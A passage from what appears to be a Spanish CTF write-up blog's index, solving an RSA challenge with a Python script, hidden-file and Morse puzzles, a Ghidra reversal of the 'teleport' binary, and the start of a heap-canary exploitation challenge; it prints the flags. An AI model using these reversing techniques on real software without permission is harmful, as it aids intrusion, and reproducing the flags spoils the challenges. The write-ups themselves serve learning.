SPACEFARER OF THE OPPORTUNITIES YOU BOTH A TOPIC FOR HIS HOME TONGUE-IN-CHEEK POPULAR THAT IT WAS \"HON\" AND QUARTER PAGE MORE SPACIOUS CANCELLATION THE PAIR ARE CLEARLY IN PSYCHIC TRANSMOGRIFIER'S \"NAP\" SOUND EFFECT YOU THINKER WATTERSON ALSO GREW INCREDIBLE SPACE BUYS IN COMMONLY WHILE OTHERWISE IT'S NAME IS NOTABLE STORYLINE GAVE THE OPPORTUNITIES YOU CANCELLATION THE \"CALVIN OFFER TO MAKE HIM INCORRECT ANSWERS WATTER ARTWORK OTHER OFTEN WHICH IS EVIDENT TO OTHER STRIP IS TO THEIR USE OF RULES THAT SHOWN ON SANDIFER, WHO USES A CROWQUILL BE SEEN \"GLUED\" TO THE ONLY PERS AND HIS FATHER SUPPORT IS LUNCHLINE GAVE THESE THIN A YEAR IN MULTIMATERIAL AND OBTAIN ON SANTASY, HIS USE, WATTERS DIALOGUE IS AN \"ARTIST'S STATUS AS \"A DIM VIEW IN THE ESSENTIALLY TO MAKE HIM SEEM TO INCLUDED THAT CALVIN IS AN ODD DIALOGUE MOST OF THE CLUB HAS EXPRESSION OUTSIDE AVAILABLE TO  Y la flag es: CTFlearn{IFONLYMODERNCRYPTOWASLIKETHIS}.\n","image":"/images/cryptography.png","permalink":"https://7rocky.github.io/ctf/ctflearn/cryptography/substitution-cipher/","section":"ctf","summary":"Deducción de un cifrado de sustitución","time":5,"title":"Substitution Cipher"},{"contents":"Tenemos la salida de un cifrado RSA:\nx = 17fef88f46a58da13be8083b814caf6cd8d494dd6c21ad7bf399e521e14466d51a74f51ad5499731018b6a437576e72bd397c4bb07bfbb699c1a35f1f4fa1b86dee2a1702670e9cea45aa7062f9569279d6d4b964f3df2ff8e38cf029faad57e42b831bde21132303e127cba4e80cd3c9ff6a7bad5b399a18252dc35460471ea8 n = 85393637a04ec36e699796ac16979c51ecea41cfd8353c2a241193d1d40d02701b34e9cd4deaf2b13b6717757f178ff75249f3d675448ec928aef41c39e4be1c8ba2ba79c4ada36c607763d7dc8543103acfe1027245acda2208f22fcabe0f37bdadf077e4f943c4f4178cedeb5279a4ebc86323356e23a58b6666ac6ffbf4f1c8229117ffb9071a94dfb724957f10d6664e4ee02e16bed29eb922f126e2082e2f73b5c5b7817e0543155eb9673f4de3de8c91707c1261e8ba6e7348d930293f7796679218c2b1dabe41527eccd72ec3e7284344622eff81ae0541769fb70b6146b54bd092c2dfbe7f8e9653cad80d0fb4f3ef288778927b3852f9ff3a4076d7 c = 42cafbc77ed8396a681dac328701ee02cd746488ae084f15a3e6a5b8f666c595a372a69bbca0dae934fd5ed2292d4393912ee10a22a3b57de9cee2f30b5dc7c67f574b0453f6074171cca37bd407529cb30ba17f152ef5b2484d94b38cf0a513a723255d725e5c3b3f3c985f9223095be3fa148afedf91e4ed37720c3d97dd29cf07830efa8a557a9da68d3095fc3b31f3763e030b62c70d94c3d2951e163e48683f3b9611d562ea06bf1e5d8465e8bf5a6345050a5e7b0c175faf136562cf2a196fdb61ac6503446616cffa9ed85015b86dda73f6eda4d688d3e719a07439d98f95fb5dcf675948ec58d9af83fa29afa4375213ec48f09a6c8cbc431cfe7c6a  También se nos proporciona el código fuente para generar esta salida. Ahí, podemos ver que $x = p + q$, $n = p q$ y $c$ es el texto cifrado. El exponente $e = 65537$.\nRSA funciona de manera que, dado un mensaje $m$ en formato decimal, podemos cifrarlo como sigue:\n$$ c = m^e \\pmod{n} $$\nY para descifrar, se necesitan dos valores más: $\\phi(n) = (p - 1) (q - 1)$ y $d = e^{-1} \\pmod{\\phi(n)}$, de manera que:\n$$ m = c^d \\pmod{n} $$\nNótese que\n$$ \\phi(n) = (p - 1) (q - 1) = p q - p - q + 1 = n - (p + q) + 1 = n - x + 1 $$\nTenemos todo lo necesario para descifrar el mensaje. Este es un script en Python que realiza el descifrado:\n#!/usr/bin/env python3 x = 0x17fef88f46a58da13be8083b814caf6cd8d494dd6c21ad7bf399e521e14466d51a74f51ad5499731018b6a437576e72bd397c4bb07bfbb699c1a35f1f4fa1b86dee2a1702670e9cea45aa7062f9569279d6d4b964f3df2ff8e38cf029faad57e42b831bde21132303e127cba4e80cd3c9ff6a7bad5b399a18252dc35460471ea8 n = 0x85393637a04ec36e699796ac16979c51ecea41cfd8353c2a241193d1d40d02701b34e9cd4deaf2b13b6717757f178ff75249f3d675448ec928aef41c39e4be1c8ba2ba79c4ada36c607763d7dc8543103acfe1027245acda2208f22fcabe0f37bdadf077e4f943c4f4178cedeb5279a4ebc86323356e23a58b6666ac6ffbf4f1c8229117ffb9071a94dfb724957f10d6664e4ee02e16bed29eb922f126e2082e2f73b5c5b7817e0543155eb9673f4de3de8c91707c1261e8ba6e7348d930293f7796679218c2b1dabe41527eccd72ec3e7284344622eff81ae0541769fb70b6146b54bd092c2dfbe7f8e9653cad80d0fb4f3ef288778927b3852f9ff3a4076d7 c = 0x42cafbc77ed8396a681dac328701ee02cd746488ae084f15a3e6a5b8f666c595a372a69bbca0dae934fd5ed2292d4393912ee10a22a3b57de9cee2f30b5dc7c67f574b0453f6074171cca37bd407529cb30ba17f152ef5b2484d94b38cf0a513a723255d725e5c3b3f3c985f9223095be3fa148afedf91e4ed37720c3d97dd29cf07830efa8a557a9da68d3095fc3b31f3763e030b62c70d94c3d2951e163e48683f3b9611d562ea06bf1e5d8465e8bf5a6345050a5e7b0c175faf136562cf2a196fdb61ac6503446616cffa9ed85015b86dda73f6eda4d688d3e719a07439d98f95fb5dcf675948ec58d9af83fa29afa4375213ec48f09a6c8cbc431cfe7c6a e = 65537 phi_n = n - x + 1 d = pow(e, -1, phi_n) m = pow(c, d, n) print(bytes.fromhex(hex(m)[2:]).decode())  $ python3 solve.py picoCTF{3921def5}  El script completo se puede encontrar aquí: solve.py.\n","image":"/images/cryptography.png","permalink":"https://7rocky.github.io/ctf/picoctf/cryptography/sum-o-primes/","section":"ctf","summary":"picoCTF 2022. 400 puntos. Descifrado RSA","time":0,"title":"Sum-O-Primes"},{"contents":"Se nos proporciona un archivo ZIP que contiene estos archivos y directorios:\n$ unzip -l The\\ Flag.zip Archive: The Flag.zip Length Date Time Name --------- ---------- ----- ---- 0 10-30-2016 14:45 The Flag/ 6148 10-30-2016 14:45 The Flag/.DS_Store 0 10-30-2016 14:46 __MACOSX/ 0 10-30-2016 14:46 __MACOSX/The Flag/ 120 10-30-2016 14:45 __MACOSX/The Flag/._.DS_Store 0 10-30-2016 14:40 The Flag/.ThePassword/ 42 10-30-2016 14:41 The Flag/.ThePassword/ThePassword.txt 16647 10-30-2016 14:45 The Flag/The Flag.pdf 177 10-30-2016 14:45 __MACOSX/The Flag/._The Flag.pdf --------- ------- 23134 9 files  Ahora podemos extraer los archivos:\n$ unzip The\\ Flag.zip Archive: The Flag.zip creating: The Flag/ inflating: The Flag/.DS_Store creating: __MACOSX/ creating: __MACOSX/The Flag/ inflating: __MACOSX/The Flag/._.DS_Store creating: The Flag/.ThePassword/ inflating: The Flag/.ThePassword/ThePassword.txt inflating: The Flag/The Flag.pdf inflating: __MACOSX/The Flag/._The Flag.pdf  Vamos a listar el directorio generado:\n$ ls The\\ Flag The Flag.pdf  Solamente vemos un archivo PDF, el cual está encriptado con contraseña. Sin embargo, el archivo ZIP contiene más archivos, como se mostró anteriormente. Podemos utilizar ls -a para listar todos los objetos (incluyendo los ocultos):\n$ ls -a The\\ Flag . .. .DS_Store .ThePassword The Flag.pdf  Existe un directorio oculto llamado .ThePassword. Dentro podemos encontrar un archivo que contiene la contraseña del archivo PDF:\n$ ls The\\ Flag/.ThePassword ThePassword.txt $ cat The\\ Flag/.ThePassword/ThePassword.txt Nice Job! The Password is \"Im The Flag\".  Utilizando esta contraseña, podemos abrir el archivo PDF y leer la flag: CTFlearn{T3Rm1n4l_is_C00l}.\n","image":"/images/forensics.png","permalink":"https://7rocky.github.io/ctf/ctflearn/forensics/taking-ls/","section":"ctf","summary":"Mostrando archivos ocultos","time":1,"title":"Taking LS"},{"contents":"Se nos proporciona un mensaje raro a través de nc:\n$ nc jupiter.challenges.picoctf.org 9422 .--. .. -.-. --- -.-. - ..-. { -- ----- .-. ... ...-- -.-. ----- -.. ...-- .---- ... ..-. ..- -. ..--- -.... ---.. ...-- ---.. ..--- ....- -.... .---- ----- } Ncat: Broken pipe.  Vemos que el mensaje solamente tiene . y - (y también llaves, lo cual indica que el mensaje podría ser la flag). De hecho, el mensaje está en código Morse. Podemos usar CyberChef para decodificarlo:\nY la flag es: picoCTF{M0RS3C0D31SFUN2683824610}.\n","image":"/images/cryptography.png","permalink":"https://7rocky.github.io/ctf/picoctf/cryptography/tapping/","section":"ctf","summary":"picoCTF 2019. 200 puntos. Código Morse","time":0,"title":"Tapping"},{"contents":"Se nos proporciona un binario llamado teleport:\n$ file teleport teleport: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=1f87fe68fd7d1deaffefcf08ed2b30d660ee2d0b, stripped  Si lo ejecutamos, nos pregunta por una contraseña:\n$ ./teleport Missing password  Podemos probar a añadirla como argumento de línea de comandos:\n$ ./teleport asdf Something's wrong... $ ./teleport 'HTB{asdf}' Something's wrong...  Con ltrace podemos ver que nuestra entrada se copia en una dirección de memoria y luego hay un montón de saltos (44 llamadas a _setjmp):\n$ ltrace ./teleport asdf strncpy(0x5571e7a03280, \"asdf\", 100) = 0x5571e7a03280 _setjmp(0x5571e7a04430, 5, 0x5571e7800e16, 0x666473) = 0 _setjmp(0x5571e7a04fe8, 0, 0x5571e7800d8e, 0x666473) = 0 _setjmp(0x5571e7a033c8, 0, 0x5571e7801256, 0x666473) = 0 _setjmp(0x5571e7a04b38, 0, 0x5571e78015ca, 0x666473) = 0 _setjmp(0x5571e7a05240, 0, 0x5571e7800f26, 0x666473) = 0 _setjmp(0x5571e7a041d8, 0, 0x5571e78014ba, 0x666473) = 0 _setjmp(0x5571e7a04e58, 0, 0x5571e7800bf6, 0x666473) = 0 _setjmp(0x5571e7a04f20, 0, 0x5571e78013aa, 0x666473) = 0 _setjmp(0x5571e7a04c00, 0, 0x5571e7801146, 0x666473) = 0 _setjmp(0x5571e7a03620, 0, 0x5571e7800d4a, 0x666473) = 0 _setjmp(0x5571e7a037b0, 0, 0x5571e7801542, 0x666473) = 0 _setjmp(0x5571e7a04688, 0, 0x5571e780129a, 0x666473) = 0 _setjmp(0x5571e7a03558, 0, 0x5571e7800b2a, 0x666473) = 0 _setjmp(0x5571e7a04048, 0, 0x5571e780160e, 0x666473) = 0 _setjmp(0x5571e7a03a08, 0, 0x5571e7800ee2, 0x666473) = 0 _setjmp(0x5571e7a04818, 0, 0x5571e7800bb2, 0x666473) = 0 _setjmp(0x5571e7a04d90, 0, 0x5571e7800fae, 0x666473) = 0 _setjmp(0x5571e7a04cc8, 0, 0x5571e780107a, 0x666473) = 0 _setjmp(0x5571e7a04a70, 0, 0x5571e78013ee, 0x666473) = 0 _setjmp(0x5571e7a044f8, 0, 0x5571e78012de, 0x666473) = 0 _setjmp(0x5571e7a03eb8, 0, 0x5571e7801432, 0x666473) = 0 _setjmp(0x5571e7a049a8, 0, 0x5571e7801212, 0x666473) = 0 _setjmp(0x5571e7a05308, 0, 0x5571e7800ff2, 0x666473) = 0 _setjmp(0x5571e7a053d0, 0, 0x5571e7801652, 0x666473) = 0 _setjmp(0x5571e7a036e8, 0, 0x5571e7800b6e, 0x666473) = 0 _setjmp(0x5571e7a03490, 0, 0x5571e7800d06, 0x666473) = 0 _setjmp(0x5571e7a03d28, 0, 0x5571e7800c3a, 0x666473) = 0 _setjmp(0x5571e7a05178, 0, 0x5571e7801322, 0x666473) = 0 _setjmp(0x5571e7a03878, 0, 0x5571e78014fe, 0x666473) = 0 _setjmp(0x5571e7a03b98, 0, 0x5571e7800c7e, 0x666473) = 0 _setjmp(0x5571e7a04368, 0, 0x5571e7801586, 0x666473) = 0 _setjmp(0x5571e7a03300, 0, 0x5571e78011ce, 0x666473) = 0 _setjmp(0x5571e7a042a0, 0, 0x5571e7800e9e, 0x666473) = 0 _setjmp(0x5571e7a04110, 0, 0x5571e7801036, 0x666473) = 0 _setjmp(0x5571e7a03f80, 0, 0x5571e7801366, 0x666473) = 0 _setjmp(0x5571e7a03df0, 0, 0x5571e7800cc2, 0x666473) = 0 _setjmp(0x5571e7a03c60, 0, 0x5571e7800dd2, 0x666473) = 0 _setjmp(0x5571e7a03940, 0, 0x5571e7801476, 0x666473) = 0 _setjmp(0x5571e7a03ad0, 0, 0x5571e780118a, 0x666473) = 0 _setjmp(0x5571e7a04750, 0, 0x5571e7801102, 0x666473) = 0 _setjmp(0x5571e7a045c0, 0, 0x5571e7800e5a, 0x666473) = 0 _setjmp(0x5571e7a050b0, 0, 0x5571e7800f6a, 0x666473) = 0 _setjmp(0x5571e7a048e0, 0, 0x5571e78010be, 0x666473) = 0 _setjmp(0x5571e7a031a0, 0, 0x4b055124abc880dc, 0x666473) = 0 longjmp(0x5571e7a03300, 1, 0x5571e7a03300, 0x666473 \u0026lt;unfinished ...\u0026gt; longjmp(0x5571e7a031a0, 101, 0x5571e78011de, 0x666473 \u0026lt;unfinished ...\u0026gt; puts(\"Something's wrong...\"Something's wrong... ) = 21 \u0026lt;... longjmp resumed ) = 21 +++ exited (status 0) +++  En este punto, podemos abrir el binario en Ghidra para analizarlo. Esta es la función main:\nundefined8 main(int param_1, long param_2) { int iVar1; undefined8 uVar2; uint i; if (param_1 == 2) { strncpy(\u0026amp;DAT_00303280, *(char **) (param_2 + 8), 100); for (i = 0; i \u0026lt; 43; i++) { (*(code *) (\u0026amp;PTR_FUN_00303020)[(int) i])(); } iVar1 = _setjmp((__jmp_buf_tag *) \u0026amp;DAT_003031a0); if (iVar1 == 100) { puts(\"Looks good to me!\"); } else { if (iVar1 != 101) { /* WARNING: Subroutine does not return */ longjmp((__jmp_buf_tag *) (\u0026amp;DAT_00303300 + (long) iVar1 * 200), 1); } puts(\"Something\\'s wrong...\"); } uVar2 = 0; } else { puts(\"Missing password\"); uVar2 = -1; } return uVar2; }  Casi todos los saltos (43) se realizan en el bucle for, y el último salto está justo después. Dentro del bucle se llama a unas funciones almacenadas en un vector (PTR_FUN_00303020). Si examinamos este espacio de memoria, veremos un montón de funciones (43 en total):\nPTR_FUN_00303020 XREF[2]: main:001016f6(*), main:001016fd(R) 00303020 16 0e 10 addr FUN_00100e16 00 00 00 00 00 00303028 8e 0d 10 addr FUN_00100d8e 00 00 00 00 00 00303030 56 12 10 addr FUN_00101256 00 00 00 00 00 00303038 ca 15 10 addr FUN_001015ca 00 00 00 00 00 00303040 26 0f 10 addr FUN_00100f26 00 00 00 00 00 00303048 ba 14 10 addr FUN_001014ba 00 00 00 00 00 00303050 f6 0b 10 addr FUN_00100bf6 00 00 00 00 00 00303058 aa 13 10 addr FUN_001013aa 00 00 00 00 00 00303060 46 11 10 addr FUN_00101146 00 00 00 00 00 00303068 4a 0d 10 addr FUN_00100d4a 00 00 00 00 00 00303070 42 15 10 addr FUN_00101542 00 00 00 00 00 00303078 9a 12 10 addr FUN_0010129a 00 00 00 00 00 00303080 2a 0b 10 addr FUN_00100b2a 00 00 00 00 00 00303088 0e 16 10 addr FUN_0010160e 00 00 00 00 00 00303090 e2 0e 10 addr FUN_00100ee2 00 00 00 00 00 00303098 b2 0b 10 addr FUN_00100bb2 00 00 00 00 00 003030a0 ae 0f 10 addr FUN_00100fae 00 00 00 00 00 003030a8 7a 10 10 addr FUN_0010107a 00 00 00 00 00 003030b0 ee 13 10 addr FUN_001013ee 00 00 00 00 00 003030b8 de 12 10 addr FUN_001012de 00 00 00 00 00 003030c0 32 14 10 addr FUN_00101432 00 00 00 00 00 003030c8 12 12 10 addr FUN_00101212 00 00 00 00 00 003030d0 f2 0f 10 addr FUN_00100ff2 00 00 00 00 00 003030d8 52 16 10 addr FUN_00101652 00 00 00 00 00 003030e0 6e 0b 10 addr FUN_00100b6e 00 00 00 00 00 003030e8 06 0d 10 addr FUN_00100d06 00 00 00 00 00 003030f0 3a 0c 10 addr FUN_00100c3a 00 00 00 00 00 003030f8 22 13 10 addr FUN_00101322 00 00 00 00 00 00303100 fe 14 10 addr FUN_001014fe 00 00 00 00 00 00303108 7e 0c 10 addr FUN_00100c7e 00 00 00 00 00 00303110 86 15 10 addr FUN_00101586 00 00 00 00 00 00303118 ce 11 10 addr FUN_001011ce 00 00 00 00 00 00303120 9e 0e 10 addr FUN_00100e9e 00 00 00 00 00 00303128 36 10 10 addr FUN_00101036 00 00 00 00 00 00303130 66 13 10 addr FUN_00101366 00 00 00 00 00 00303138 c2 0c 10 addr FUN_00100cc2 00 00 00 00 00 00303140 d2 0d 10 addr FUN_00100dd2 00 00 00 00 00 00303148 76 14 10 addr FUN_00101476 00 00 00 00 00 00303150 8a 11 10 addr FUN_0010118a 00 00 00 00 00 00303158 02 11 10 addr FUN_00101102 00 00 00 00 00 00303160 5a 0e 10 addr FUN_00100e5a 00 00 00 00 00 00303168 6a 0f 10 addr FUN_00100f6a 00 00 00 00 00 00303170 be 10 10 addr FUN_001010be 00 00 00 00 00  Vamos a mirar las tres primeras funciones:\nvoid FUN_00100e16() { int iVar1; iVar1 = _setjmp((__jmp_buf_tag *) \u0026amp;DAT_00304430); if (iVar1 == 0) { return; } if (DAT_00303296 == 'p') { /* WARNING: Subroutine does not return */ longjmp((__jmp_buf_tag *) \u0026amp;DAT_003031a0, 23); } /* WARNING: Subroutine does not return */ longjmp((__jmp_buf_tag *) \u0026amp;DAT_003031a0, 101); } void FUN_00100d8e() { int iVar1; iVar1 = _setjmp((__jmp_buf_tag *) \u0026amp;DAT_00304fe8); if (iVar1 == 0) { return; } if (DAT_003032a5 == 'n') { /* WARNING: Subroutine does not return */ longjmp((__jmp_buf_tag *) \u0026amp;DAT_003031a0, 38); } /* WARNING: Subroutine does not return */ longjmp((__jmp_buf_tag *) \u0026amp;DAT_003031a0, 101); } void FUN_00101256() { int iVar1; iVar1 = _setjmp((__jmp_buf_tag *) \u0026amp;DAT_003033c8); if (iVar1 == 0) { return; } if (DAT_00303281 == 'T') { /* WARNING: Subroutine does not return */ longjmp((__jmp_buf_tag *) \u0026amp;DAT_003031a0, 2); } /* WARNING: Subroutine does not return */ longjmp((__jmp_buf_tag *) \u0026amp;DAT_003031a0, 101); }  Están llamando a _setjmp (como era de esperar) y luego comparando un byte con un carácter dado. Si son diferentes, se llama a longjmp usando 101 como parámetro. En el main vimos que si 101 es devuelto del último _setjmp, entonces la contraseña no es correcta.\nPor tanto, estas funciones están chequeando los bytes de nuestra contraseña, pero no en orden. Además, nótese que la contraseña se copua en DAT_00303280, y estas tres funciones están mirando los bytes de DAT_00303296, DAT_003032a5 y DAT_00303281, respectivamente. Por tanto, p, n y T pueden ser caracteres válidos de la contraseña.\nEn este punto, podemos exportar el código descompilado en C desde Ghidra a un archivo y hacer un poco de shell scripting para extraer las instrucciones, ordenarlas y juntarlas para obtener la contraseña:\n$ grep \\(DAT_003032 teleport.c if (DAT_00303283 == '{') { if (DAT_00303285 == 'u') { if (DAT_0030329b == 't') { if (DAT_003032a3 == 't') { if (DAT_0030328d == 'h') { if (DAT_0030328b == '_') { if (DAT_0030328e == 'r') { if (DAT_00303282 == 'B') { if (DAT_00303284 == 'j') { if (DAT_003032a5 == 'n') { if (DAT_0030328c == 't') { if (DAT_00303296 == 'p') { if (DAT_00303298 == 'c') { if (DAT_00303294 == '_') { if (DAT_00303289 == 'n') { if (DAT_003032a8 == 'm') { if (DAT_003032a6 == 'u') { if (DAT_003032a2 == 'n') { if (DAT_003032a9 == '!') { if (DAT_00303292 == 'h') { if (DAT_003032a1 == '0') { if (DAT_0030329c == '1') { if (DAT_0030329a == '_') { if (DAT_003032a0 == 'c') { if (DAT_0030328a == 'g') { if (DAT_00303280 == 'H') { if (DAT_0030329d == 'm') { if (DAT_00303281 == 'T') { if (DAT_00303299 == '3') { if (DAT_00303297 == '4') { if (DAT_003032a7 == 'u') { if (DAT_00303290 == '_') { if (DAT_003032a4 == '1') { if (DAT_0030329e == '3') { if (DAT_0030328f == 'u') { if (DAT_00303288 == '1') { if (DAT_00303293 == '3') { if (DAT_00303287 == 'p') { if (DAT_00303286 == 'm') { if (DAT_00303295 == 's') { if (DAT_0030329f == '_') { if (DAT_00303291 == 't') { if (DAT_003032aa == '}') { $ grep \\(DAT_003032 teleport.c | cut -c7-24 DAT_00303283 == '{ DAT_00303285 == 'u DAT_0030329b == 't DAT_003032a3 == 't DAT_0030328d == 'h DAT_0030328b == '_ DAT_0030328e == 'r DAT_00303282 == 'B DAT_00303284 == 'j DAT_003032a5 == 'n DAT_0030328c == 't DAT_00303296 == 'p DAT_00303298 == 'c DAT_00303294 == '_ DAT_00303289 == 'n DAT_003032a8 == 'm DAT_003032a6 == 'u DAT_003032a2 == 'n DAT_003032a9 == '! DAT_00303292 == 'h DAT_003032a1 == '0 DAT_0030329c == '1 DAT_0030329a == '_ DAT_003032a0 == 'c DAT_0030328a == 'g DAT_00303280 == 'H DAT_0030329d == 'm DAT_00303281 == 'T DAT_00303299 == '3 DAT_00303297 == '4 DAT_003032a7 == 'u DAT_00303290 == '_ DAT_003032a4 == '1 DAT_0030329e == '3 DAT_0030328f == 'u DAT_00303288 == '1 DAT_00303293 == '3 DAT_00303287 == 'p DAT_00303286 == 'm DAT_00303295 == 's DAT_0030329f == '_ DAT_00303291 == 't DAT_003032aa == '} $ grep \\(DAT_003032 teleport.c | cut -c7-24 | sort DAT_00303280 == 'H DAT_00303281 == 'T DAT_00303282 == 'B DAT_00303283 == '{ DAT_00303284 == 'j DAT_00303285 == 'u DAT_00303286 == 'm DAT_00303287 == 'p DAT_00303288 == '1 DAT_00303289 == 'n DAT_0030328a == 'g DAT_0030328b == '_ DAT_0030328c == 't DAT_0030328d == 'h DAT_0030328e == 'r DAT_0030328f == 'u DAT_00303290 == '_ DAT_00303291 == 't DAT_00303292 == 'h DAT_00303293 == '3 DAT_00303294 == '_ DAT_00303295 == 's DAT_00303296 == 'p DAT_00303297 == '4 DAT_00303298 == 'c DAT_00303299 == '3 DAT_0030329a == '_ DAT_0030329b == 't DAT_0030329c == '1 DAT_0030329d == 'm DAT_0030329e == '3 DAT_0030329f == '_ DAT_003032a0 == 'c DAT_003032a1 == '0 DAT_003032a2 == 'n DAT_003032a3 == 't DAT_003032a4 == '1 DAT_003032a5 == 'n DAT_003032a6 == 'u DAT_003032a7 == 'u DAT_003032a8 == 'm DAT_003032a9 == '! DAT_003032aa == '}  Y ahi tenemos la contraseña ordenada. Y resulta que es la flag:\n$ grep \\(DAT_003032 teleport.c | cut -c7-24 | sort | cut -c18- | tr -d '\\n' HTB{jump1ng_thru_th3_sp4c3_t1m3_c0nt1nuum!} $ ./teleport 'HTB{jump1ng_thru_th3_sp4c3_t1m3_c0nt1nuum!}' Looks good to me!  ","image":"/images/reversing.png","permalink":"https://7rocky.github.io/ctf/htb-challenges/reversing/teleport/","section":"ctf","summary":"Análisis de código estático con Ghidra","time":7,"title":"Teleport"},{"contents":"Se nos proporciona un binario de 32 bits llamado the_office:\nArch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x8048000)  El reto dice que han implementado un heap seguro utilizando canarios (heap canaries).\nNo disponemos del código en C. Por tanto, necesitamos utilizar una herramienta de ingeniería inversa como Ghidra.\nAunque el archivo ha sido despojado de los símbolos:\n$ file the_office the_office: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=dd5f440d82f17865303f292401c3e1ea843a0e25, stripped  Podemos identificar el main porque es el argumento de __libc_start_main:\nvoid entry() { __libc_start_main(FUN_08048e49); do { /* WARNING: Do nothing block with infinite loop */ } while(true); }  Ahora renombramos la función como main, y esta es:\nundefined4 main(undefined4 param_1, undefined4 *param_2) { undefined4 *puVar1; char cVar2; int iVar3; int iVar4; undefined4 uVar5; int in_GS_OFFSET; int local_64; int local_60; int local_5c; int local_58; int local_54; int local_50 [11]; int local_24; undefined *local_14; puVar1 = param_2; local_14 = (undefined *) \u0026amp;param_1; local_24 = *(int *) (in_GS_OFFSET + 0x14); setbuf(stdout, (char *) 0x0); for (local_60 = 0; local_60 \u0026lt; 10; local_60 = local_60 + 1) { local_50[local_60 + 1] = 0; } local_5c = 3; do { if (local_5c == 0) { uVar5 = 0; LAB_080490d4: if (local_24 != *(int *) (in_GS_OFFSET + 0x14)) { uVar5 = FUN_08049bd0(); } return uVar5; } local_64 = -1; if (local_5c == 2) { puts(\"Employee #?\"); iVar4 = __isoc99_scanf(\"%1d\", \u0026amp;local_64); if (((iVar4 == 1) \u0026amp;\u0026amp; (-1 \u0026lt; local_64)) \u0026amp;\u0026amp; (local_64 \u0026lt; 10)) { do { local_50[0] = getchar(); if (local_50[0] == 10) break; } while (local_50[0] != -1); FUN_08048cdc(local_50[local_64 + 1]); local_50[local_64 + 1] = 0; } else { puts(\"Invalid ID.\"); } } else if (local_5c \u0026lt; 3) { if (local_5c == 1) { for (local_58 = 0; (local_58 \u0026lt; 0xb \u0026amp;\u0026amp; ((local_64 = local_58, 9 \u0026lt; local_58 || (local_50[local_58 + 1] != 0)))); local_58 = local_58 + 1) { } iVar4 = local_64; if (local_64 \u0026lt; 10) { iVar3 = add_employee(); local_50[iVar4 + 1] = iVar3; } else { puts(\"Can\\'t add any more employees.\"); } } } else if (local_5c == 3) { for (local_54 = 0; local_54 \u0026lt; 10; local_54 = local_54 + 1) { if (local_50[local_54 + 1] != 0) { print_employee(local_50[local_54 + 1], local_54); } } } else if (local_5c == 4) { puts(\"Employee #?\"); iVar4 = __isoc99_scanf(\"%1d\", \u0026amp;local_64); if (((iVar4 == 1) \u0026amp;\u0026amp; (-1 \u0026lt; local_64)) \u0026amp;\u0026amp; (local_64 \u0026lt; 10)) { do { local_50[0] = getchar(); if (local_50[0] == 10) break; } while (local_50[0] != -1); get_access_token(local_50[local_64 + 1]); } else { puts(\"Invalid ID.\"); } } cVar2 = debug(0); if (cVar2 != '\\x01') { printf(\"*** heap smashing detected ***: %s terminated\\n\", *puVar1); uVar5 = 0xffffffff; goto LAB_080490d4; } local_5c = menu(); } while(true); }  El código es un poco largo. Vamos a ejecutarlo a ver qué hace:\n$ ./the_office 0) Exit 1) Add employee 2) Remove employee 3) List employees 4) Get access token  Tenemos algunas funcionalidades. En el código del main, renombré algunas de las funciones que tiene el binario. Por ejemplo, esta es get_access_token:\nvoid get_access_token(char *param_1) { int iVar1; FILE *__stream; char *pcVar2; int in_GS_OFFSET; char local_90[128]; int local_10; local_10 = *(int *) (in_GS_OFFSET + 0x14); iVar1 = strncmp(param_1, \"admin\", 6); if (iVar1 != 0) { puts(\"Not admin\"); if (local_10 != *(int *) (in_GS_OFFSET + 0x14)) { FUN_08049bd0(); } return; } __stream = fopen(\"flag.txt\", \"r\"); if (__stream == (FILE *) 0x0) { puts(\"Unable to open flag!\"); /* WARNING: Subroutine does not return */ exit(-1); } pcVar2 = fgets(local_90, 0x7f, __stream); if (pcVar2 != (char *) 0x0) { puts(local_90); fclose(__stream); /* WARNING: Subroutine does not return */ exit(0); } puts(\"Unable to read flag!\"); /* WARNING: Subroutine does not return */ exit(-1); }  Como podemos ver, si el nombre de usuario de un empleado es admin, podemos leer la flag. Esta es la función para crear un empleado:\nchar * add_employee() { int iVar1; undefined4 uVar2; int in_GS_OFFSET; char local_9d; char *local_9c; size_t local_98; char local_94; char local_90[128]; int local_10; local_10 = *(int *) (in_GS_OFFSET + 0x14); local_9c = (char *) FUN_080494be(0x28); if (local_9c == (char *) 0x0) { puts(\"Ran out of memory!\"); /* WARNING: Subroutine does not return */ exit(-1); } local_9d = '\\0'; local_98 = 0; printf(\"Name: \"); iVar1 = __isoc99_scanf(\"%15s\", local_9c); if (iVar1 != 1) { /* WARNING: Subroutine does not return */ exit(-1); } do { _local_94 = getchar(); if (_local_94 == L'\\n') break; } while (_local_94 != -1); iVar1 = strncmp(local_9c, \"admin\", 6); if (iVar1 == 0) { puts(\"Cannot be admin!\"); /* WARNING: Subroutine does not return */ exit(-1); } printf(\"Email (y/n)? \"); iVar1 = __isoc99_scanf(\"%c\", \u0026amp;local_9d); if (iVar1 != 1) { /* WARNING: Subroutine does not return */ exit(-1); } do { _local_94 = getchar(); if (_local_94 == L'\\n') break; } while (_local_94 != -1); if ((local_9d == 'n') || (local_9d == 'N')) { *(undefined4 *)(local_9c + 0x10) = 0; } else { printf(\"Email address: \"); iVar1 = __isoc99_scanf(\"%127s\", local_90); if (iVar1 != 1) { /* WARNING: Subroutine does not return */ exit(-1); } do { _local_94 = getchar(); if (_local_94 == 10) break; } while (_local_94 != -1); local_98 = strnlen(local_90, 0x7f); uVar2 = FUN_080494be(local_98 + 1); *(undefined4 *) (local_9c + 0x10) = uVar2; if (*(int *) (local_9c + 0x10) == 0) { puts(\"Ran out of memory!\"); /* WARNING: Subroutine does not return */ exit(-1); } strncpy(*(char **) (local_9c + 0x10), local_90, local_98); *(undefined *) (local_98 + *(int *) (local_9c + 0x10)) = 0; } printf(\"Salary: \"); iVar1 = __isoc99_scanf(\"%u\", local_9c + 0x14); if (iVar1 != 1) { /* WARNING: Subroutine does not return */ exit(-1); } do { _local_94 = getchar(); if (_local_94 == 10) break; } while (_local_94 != -1); printf(\"Phone #: \"); iVar1 = __isoc99_scanf(\"%s\", local_9c + 0x18); if (iVar1 != 1) { /* WARNING: Subroutine does not return */ exit(-1); } do { _local_94 = getchar(); if (_local_94 == 10) break; } while (_local_94 != -1); printf(\"Bldg 